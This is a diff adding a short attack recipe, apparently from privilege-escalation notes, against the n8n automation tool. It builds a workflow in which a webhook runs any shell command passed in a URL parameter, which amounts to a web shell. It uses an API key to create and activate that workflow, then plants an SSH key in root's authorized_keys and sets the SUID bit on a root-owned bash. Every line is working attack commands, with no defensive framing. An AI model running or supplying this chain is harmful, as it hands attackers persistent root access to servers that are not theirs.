@@ -1,0 +1,34 @@
+- n8n:
+
+cat > /tmp/wf.json <<'EOF'
+{
+  "name":"ws",
+  "nodes":[
+    {"parameters":{"httpMethod":"GET","path":"ws","responseMode":"lastNode"},
+     "name":"Webhook","type":"n8n-nodes-base.webhook","typeVersion":1,"position":[250,300],"webhookId":"ws"},
+    {"parameters":{"command":"={{ $json.query.cmd }}"},
+     "name":"Exec","type":"n8n-nodes-base.executeCommand","typeVersion":1,"position":[500,300]}
+  ],
+  "connections":{"Webhook":{"main":[[{"node":"Exec","type":"main","index":0}]]}},
+  "settings":{}
+}
+EOF
+
+# Validation n8n API Key:
+curl -s -H "X-N8N-API-KEY: $N8N_API_KEY" http://127.0.0.1:5678/api/v1/workflows
+
+# Create n8n workflow:
+curl -s -H "X-N8N-API-KEY: $N8N_API_KEY" -H "Content-Type: application/json" -X POST http://127.0.0.1:5678/api/v1/workflows -d @/tmp/wf.json
+
+# Activate the workflow:
+curl -s -H "X-N8N-API-KEY: $N8N_API_KEY" -X POST http://127.0.0.1:5678/api/v1/workflows/<Workflow_ID>/activate
+
+# Trigger Command:
+curl -s -G http://127.0.0.1:5678/webhook/ws --data-urlencode "cmd=mkdir -p /root/.ssh"
+curl -s -G http://127.0.0.1:5678/webhook/ws --data-urlencode "cmd=chown -R 1001:1001 /root/.ssh && chmod 700 /root/.ssh"
+curl -s -G http://127.0.0.1:5678/webhook/ws --data-urlencode "cmd=echo '<ssh.pub>' > /root/.ssh/authorized_keys"
+curl -s -G http://127.0.0.1:5678/webhook/ws --data-urlencode "cmd=chmod 600 /root/.ssh/authorized_keys"
+
+# Escalate priv:
+curl -s -G http://127.0.0.1:5678/webhook/ws --data-urlencode "cmd=chown root:root /root/bash"
+curl -s -G http://127.0.0.1:5678/webhook/ws --data-urlencode "cmd=chmod 4755 /root/bash"
